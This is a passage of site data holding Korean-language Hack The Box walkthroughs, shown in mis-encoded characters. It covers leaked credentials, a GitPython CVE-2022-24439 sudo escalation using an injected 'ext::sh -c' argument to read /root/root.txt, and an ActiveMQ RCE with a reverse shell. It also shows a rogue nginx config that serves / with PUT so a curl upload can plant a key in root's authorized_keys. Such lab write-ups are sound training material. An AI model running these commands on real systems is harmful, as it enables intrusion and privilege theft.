\"methods\": \"GET\"\n      }\n    },\n    {\n      \"new_authors\": {\n        \"description\": \"Retrieve the welcome message sended to our new authors.\",\n        \"endpoint\": \"/api/latest/metadata/messages/authors\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"platform_use\": {\n        \"description\": \"Retrieve examples of how to use the platform.\",\n        \"endpoint\": \"/api/latest/metadata/messages/how_to_use_platform\",\n        \"methods\": \"GET\"\n      }\n    }\n  ],\n  \"version\": [\n    {\n      \"changelog\": {\n        \"description\": \"Retrieve a list of all the versions and updates of the api.\",\n        \"endpoint\": \"/api/latest/metadata/changelog\",\n        \"methods\": \"GET\"\n      }\n    },\n    {\n      \"latest\": {\n        \"description\": \"Retrieve the last version of api.\",\n        \"endpoint\": \"/api/latest/metadata\",\n        \"methods\": \"GET\"\n      }\n    }\n  ]\n}\n```\nì´ì¤‘ `/api/latest/metadata/messages/authors`ë¥¼ ë¦¬í€˜ìŠ¤íŠ¸ë¡œ ë³´ë‚´ë©´ ìƒˆë¡œìš´ ë””ë ‰í† ë¦¬ê°€ ë¦¬ìŠ¤í€ìŠ¤ë¡œ ëŒì•„ì˜¤ê²Œ ëœë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7814a566-da48-4612-818a-c34e16959f1c/image.png)\n\nê·¸ë¦¬ê³  ì´ì „ê³¼ ê°™ì´ ë¦¬ìŠ¤í€ìŠ¤ë¡œ ëŒì•„ì˜¨ ë””ë ‰í† ë¦¬ë¡œ ì ‘ì†í•˜ë©´ ìë™ìœ¼ë¡œ íŒŒì¼ì´ ë‹¤ìš´ë¡œë“œ ëœë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/10a080ea-88d4-4165-8365-6234f1840770/image.png)\n\nê·¸ë¦¬ê³  ë‹¤ìš´ë¡œë“œëœ íŒŒì¼ì„ ì—´ì–´ë³´ë©´ ì•„ë˜ì™€ ê°™ì€ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ íšë“í•  ìˆ˜ ìˆë‹¤.\n- ìœ ì €ë„¤ì„ `dev` \n- ë¹„ë°€ë²ˆí˜¸ `dev080217_devAPI!@`  \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/9cf4cb93-6506-4cd4-8f64-c2652f7b0307/image.png)\n\n## ì´ˆì…\nì–»ì€ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ ì´ìš©í•´ SSHì— ì—°ê²°í•´ë³´ì.\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/e9265bde-e6c4-4931-8437-6ca01f2ca296/image.png)\n\n## ì¸¡ë©´ ì´ë™ (Lateral Movement)\n`~/apps` ì— ê¹ƒ(git)ì´ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/54649a1e-bf6a-483a-b6a9-a916deb0989e/image.png)\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/788c8a3f-16d3-4664-9861-ed8b7d8b549f/image.png)\n\n`~/apps/.git/logs` ì—ì„œ í•˜ì´ë¼ì´íŠ¸ëœ ë¶€ë¶„ì„ ì•„ë˜ì˜ ëª…ë ¹ì–´ë¥¼ ì´ìš©í•´ ìì„¸íˆ ì‚´í´ë³´ì. \n\n```sh\ngit show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae commit b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae\n```\nê·¸ëŸ¬ë©´ ì•„ë˜ì™€ ê°™ì€ íƒ¬í”Œë › ë©”ì¼ ë©”ì„¸ì§€ `template_mail_message` ë‚´ìš©ì„ ë³¼ ìˆ˜ ìˆê³ , ì´ì „ê³¼ ê°™ì´ ìƒˆë¡œìš´ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ ì–»ì„ ìˆ˜ ìˆë‹¤. \n\n- ìœ ì €ë„¤ì„: `prod`\n- ë¹„ë°€ë²ˆí˜¸: `080217_Producti0n_2023!@`\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/87696c9a-acce-4d0b-8747-8639d7ba44c0/image.png)\n\nìƒˆë¡œ ì–»ì€ ë¡œê·¸ì¸ ìê²©ì¦ëª…ì„ ì´ìš©í•´ SSHì— ì—°ê²°í•˜ì. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/db395340-5adc-4aa7-9a8c-a999255c9d1a/image.png)\n\n## ê¶Œí•œ ìƒìŠ¹ (Privilege Escalation)\nìŠˆí¼ìœ ì €ë¡œ ì‹¤í–‰í•  ìˆ˜ ìˆëŠ” ê¶Œí•œì„ í™•ì¸í•˜ê¸° ìœ„í•´ `sudo -l` ë¥¼ ì‚´í´ë³´ë©´\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/98018cdc-2259-4e1c-8297-02d39f4fd425/image.png)\n\n`/opt/internal_apps/clone_changes/clone_prod_change.py *` íŒŒì´ì¬ íŒŒì¼ì„ ê¶Œí•œ ìƒìŠ¹ì—†ì´ ì‹¤í–‰ ì‹œí‚¬ ìˆ˜ ìˆë‹¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. \n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/e05aaac8-1689-405e-b57f-655b19f5cd5b/image.png)\n\nì—¬ê¸°ì„œ ì¤‘ìš”í•œ ë¶€ë¶„ì€ ì•„ë˜ì™€ ê°™ë‹¤. \n\n```python\nfrom git import Repo\n```\n\nì´ ìŠ¤í¬ë¦½íŠ¸ê°€ GitPython ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ í™œìš©í•˜ì—¬ Git ì‘ì—…ì„ ìˆ˜í–‰í•œë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆëŠ” ëŒ€ëª©ì´ê¸° ë•Œë¬¸ì— ì´ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ê°€ì¥ ìœ ìš©í•œ ì •ë³´ë¼ê³  í•  ìˆ˜ ìˆë‹¤. \n\nêµ¬ê¸€ì— `from git import Repo` ì˜ ì·¨ì•½ì ì„ ê²€ìƒ‰í•˜ë©´ [CVE-2022-24439](https://nvd.nist.gov/vuln/detail/CVE-2022-24439)ì— ê´€í•œ ë‚´ìš©ì„ ì°¾ì•„ë³¼ ìˆ˜ ìˆê³  ì´ë¥¼ ì•…ìš©í•´ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆë‹¤. \n\në‚˜ëŠ” https://github.com/gitpython-developers/GitPython/issues/1515 ì—¬ê¸°ì™€ ì—¬ê¸° https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858 ë¥¼ ì°¸ê³ í–ˆë‹¤. \n\n```sh\nsudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py 'ext::sh -c cat% /root/root.txt% >% /tmp/root'\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/1e3ee081-6a2c-4fd1-b7d1-ed60143190c5/image.png)\n\nì´ë ‡ê²Œ `sudo`ì™€ í•¨ê»˜ ìƒìœ„ ëª…ë ¹ì–´ë¥¼ ì…ë ¥í•˜ë©´ í•˜ë©´ ë£¨íŠ¸ë¡œ ê¶Œí•œ ìƒìŠ¹ì„ í•  ìˆ˜ ìˆë‹¤. "},{"excerpt":"Broker ìš”ì•½  BrokerëŠ” Apache ActiveMQë¥¼ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì‰¬ìš´ ë‚œì´ë„ì˜ ë¦¬ëˆ…ìŠ¤ ë¨¸ì‹ ì´ë‹¤. \n'Apache ActiveMQ' ë²„ì „ì„ ì°¾ì•„ë³´ë©´ ì›ê²© ì½”ë“œ ì‹¤í–‰ (Unauthenticated Remote Code Execution)ì— ì·¨ì•½í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ ì•…ìš©í•´ì„œ íƒ€ê²Ÿ ì‹œìŠ¤í…œ ì´ˆì…ì„ í•  ìˆ˜ ìˆë‹¤. ì´í›„, ê¶Œí•œìƒìŠ¹ì„ ìœ„í•œ ì •ë³´ë¥¼ â€¦","fields":{"slug":"/Broker/"},"frontmatter":{"date":"February 07, 2025","title":"Broker","tags":["HTB","sudo-l","ë¦¬ëˆ…ìŠ¤"]},"rawMarkdownBody":"## Broker ìš”ì•½\n![](https://velog.velcdn.com/images/h3llanut3lla/post/68b13905-0b9c-4d3a-aff0-d787acc4723c/image.png)\n\nBrokerëŠ” Apache ActiveMQë¥¼ í˜¸ìŠ¤íŒ…í•˜ëŠ” ì‰¬ìš´ ë‚œì´ë„ì˜ ë¦¬ëˆ…ìŠ¤ ë¨¸ì‹ ì´ë‹¤. \n'Apache ActiveMQ' ë²„ì „ì„ ì°¾ì•„ë³´ë©´ ì›ê²© ì½”ë“œ ì‹¤í–‰ (Unauthenticated Remote Code Execution)ì— ì·¨ì•½í•˜ë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì´ë¥¼ ì•…ìš©í•´ì„œ íƒ€ê²Ÿ ì‹œìŠ¤í…œ ì´ˆì…ì„ í•  ìˆ˜ ìˆë‹¤. ì´í›„, ê¶Œí•œìƒìŠ¹ì„ ìœ„í•œ ì •ë³´ë¥¼ ì–»ë‹¤ë³´ë©´ ì˜ëª»ëœ sudo êµ¬ì„±ì„ ì°¾ì„ ìˆ˜ ìˆê³ , `sudo /usr/sbin/nginx` ë¥¼ í†µí•´ ê°€ì¥ ë†’ì€ ê¶Œí•œì¸ root ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆë‹¤. ì´ ë°©ì‹ì€ 'Zimbra' ì·¨ì•½ì  ë””ìŠ¤í´ë¡œì ¸ì™€ ë¹„ìŠ·í•˜ë‹¤.\n\n## ì •ë³´ ìˆ˜ì§‘\n### Nmap í¬íŠ¸ ìŠ¤ìº”\nTCP ìŠ¤ìº”ë‚´ìš©\n```sh\nâ””â”€$ nmap -sC -sV 10.10.11.243                 \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-01 13:33 AEST\nNmap scan report for 10.10.11.243\nHost is up (0.016s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)\n|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\n| http-auth: \n| HTTP/1.1 401 Unauthorized\\x0D\n|_  basic realm=ActiveMQRealm\n|_http-title: Error 401 Unauthorized\n|_http-server-header: nginx/1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n```\nHTTP í¬íŠ¸ê°€ ì—´ë ¤ ìˆìœ¼ë‹ˆ ìš°ì„  ë“¤ì–´ê°€ë³´ì. \n\n### 80-HTTP\n![](https://velog.velcdn.com/images/h3llanut3lla/post/38604c0c-c362-4cd4-a2df-e10dfecc5f58/image.png)\nì—¬ê¸°ì— ë””í´íŠ¸ ìœ ì €ë„¤ì„ `admin` ë¹„ë°€ë²ˆí˜¸ `admin` ìœ¼ë¡œ ë¡œê·¸ì¸í•˜ë©´ ì•„ë˜ì™€ ê°™ì´ ì •í™•í•œ ë²„ì „ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. \n>Version 5.15.15\n![](https://velog.velcdn.com/images/h3llanut3lla/post/74d467cb-1171-416a-a42d-ceaafee12d08/image.png)\n\n## ì´ˆì…\n`ActiveMQ 5.15.15 github` í˜¹ì€ `ActiveMQ 5.15.15 exploits` ë¼ê³  êµ¬ê¸€ì— ê²€ìƒ‰í•´ë³´ë©´ ì—¬ëŸ¬ ì—‘ìŠ¤í”Œë¡œì´íŠ¸ë“¤ì´ ë‚˜ì˜¤ëŠ”ë°, ë‚˜ëŠ” ê·¸ ì¤‘ https://github.com/X1r0z/ActiveMQ-RCE/tree/main ì´ê±¸ ì‚¬ìš©í–ˆë‹¤. \n\n`poc.xml` íŒŒì¼ì— ë¦¬ë²„ìŠ¤ì‰˜ì„ ë„£ì–´ì£¼ë©´ ëœë‹¤.\n\n```xml\n<list>\n  <value>ì—¬ê¸°ì— ë¦¬ë²„ìŠ¤ ì‰˜ ì…ë ¥</value>\n</list>\n```\n\nìˆ˜ì •ëœ `poc.xml`\n![](https://velog.velcdn.com/images/h3llanut3lla/post/491ee409-7cd0-45a2-a996-9f2fac982eea/image.png)\n\nê·¸ë ‡ë‹¤ë©´ ì´ë ‡ê²Œ íƒ€ê²Ÿì— ì‰˜ì´ ìƒê¸´ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤ (ìš°ì¸¡ ìƒë‹¨).\n![](https://velog.velcdn.com/images/h3llanut3lla/post/7673de1b-d013-4bbd-986d-66d1b431be92/image.png)\n\n## ê¶Œí•œ ìƒìŠ¹\n`sudo` ë¡œ ì‚¬ìš© ê°€ëŠ¥í•œ ëª…ë ¹ì–´ë¥¼ í™•ì¸í•˜ê¸° ìœ„í•´ `sudo -l` ì´ë¼ê³  ì³ë³´ë©´ `/usr/sbin/nginx` ê°€ ê¶Œí•œ ìƒìŠ¹ ì—†ì´ ì“¸ ìˆ˜ ìˆëŠ”ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.  \n![](https://velog.velcdn.com/images/h3llanut3lla/post/2f6ed5c9-2163-4c51-bfe9-a3f6e1f88b19/image.png)\n\n`nginx` í—¬í”„ í˜ì´ì§€ë¥¼ ë³´ë©´ ì¹œì ˆí•˜ê²Œë„ ì•„ë˜ì™€ ê°™ì´ ë²„ì „ì •ë³´ë¥¼ í™•ì¸í•  ìˆ˜ ìˆë‹¤. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/d40d38a9-a20a-4327-9f97-8ec02b03b47f/image.png)\n\n[Zimbra ë””ìŠ¤í´ë¡œì ¸](https://github.com/advisories/GHSA-w7p3-hmmp-qmx6)ì™€ ê°™ì€ ë°©ì‹ìœ¼ë¡œ ì§„í–‰í•´ë³´ì. \n\n`nginx` êµ¬ì„±íŒŒì¼ì¤‘ `user-www-data` ë¼ê³  ì‘ì„±ë˜ì–´ ìˆëŠ” ë¶€ë¶„ì„ `root` ë¡œ ë°”ê¿”ì£¼ë©´ ëœë‹¤. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/0c303d62-bd24-4a0e-8f86-00da12b5c4c8/image.png)\n\nì•„ë˜ì™€ ê°™ì€ `pwn.conf` ë¼ëŠ” ìƒˆ êµ¬ì„±íŒŒì¼ì„ ë§Œë“¤ì–´ì¤€ë‹¤.\n```sh\nuser root; # ì›Œì»¤ í”„ë¡œì„¸ìŠ¤ê°€ root ê¶Œí•œìœ¼ë¡œ ì‹¤í–‰\nworker_processes 4;\npid /tmp/nginx.pid;\nevents {\n\t\tworker_connections 768;\n}\nhttp {\n\tserver {\n\t\tlisten 1337;\n\t\troot /;\n\t\tautoindex on;\n\t\tdav_methods PUT;\n\t}\n}\n```\n\n![](https://velog.velcdn.com/images/h3llanut3lla/post/b7b868a1-578b-4de5-bfd0-b0cdab7c91dd/image.png)\nìƒˆë¡œ ë§Œë“  `pwn.conf` ê°€ ì˜ ì‹¤í–‰ë˜ì—ˆëŠ”ì§€ í™•ì¸í•˜ê¸° ìœ„í•´, ì—´ë¦° í¬íŠ¸ë¥¼ ë³´ë©´ ì•„ë˜ì™€ ê°™ì´ í¬íŠ¸ 1337ì´ ì—´ë¦°ê²ƒì„ ë³¼ ìˆ˜ ìˆë‹¤. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/906e1180-82e5-4365-b8c5-7a05a351eb05/image.png)\n\nê·¸ëŸ¼ ì´ì œ `/root/.ssh/authorized_keys` ì— ëŒ€í•œ ê³µê°œ SSHí‚¤ë¥¼ ë§Œë“¤ì–´ë³´ì. \n![](https://velog.velcdn.com/images/h3llanut3lla/post/7700d7cb-b3f7-4e86-a8b8-5df4cc597c84/image.png)\n\nì¹¼ë¦¬ì—ì„œ \n```sh\n# SSHí‚¤ ìƒì„±\nssh-keygen -f broker\n\n# ìƒì„±ëœ í‚¤ë¥¼ íƒ€ê²Ÿì— ì „ë‹¬\ncurl 10.10.11.243:1337/root/.ssh/authorized_keys --upload-file broker.pub\n```\n\nê·¸ë¦¬ê³  í‚¤ë¥¼ ì´ìš©í•´ SSHë¡œ ì ‘ì†í•˜ë©´\n```sh\nssh -i broker root@10.10.11.243\n```\n![](https://velog.velcdn.com/images/h3llanut3lla/post/f5039481-5ee3-4380-9be3-b14aed525772/image.png)\n\n`root`ë¡œ ê¶Œí•œì´ ìƒìŠ¹ëœê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. "}]}},"pageContext":{}},"staticQueryHashes":[],"slicesMap":{}}